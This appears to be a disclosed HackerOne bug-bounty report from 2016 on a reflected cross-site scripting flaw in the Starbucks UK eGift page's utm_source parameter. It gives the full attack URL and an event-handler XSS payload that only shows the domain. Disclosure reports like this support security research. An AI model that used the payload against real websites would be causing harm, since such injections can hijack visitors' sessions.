# www.starbucks.co.uk Reflected XSS via utm_source parameter

## Report Details
- **Report ID**: 140616
- **URL**: https://hackerone.com/reports/140616
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-24T02:11:53.397Z
- **Disclosed**: 2016-12-19T22:48:31.074Z

## Reporter
- **Username**: meals
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
https://www.starbucks.co.uk/shop/card/egift?utm_campaign=egift&utm_content=WinterFY16&utm_medium=GPH&utm_source=SBUXcouk"%3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e

Payload: "%3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e

## Attachments
- Screen_Shot_2016-05-23_at_10.11.02_PM.png
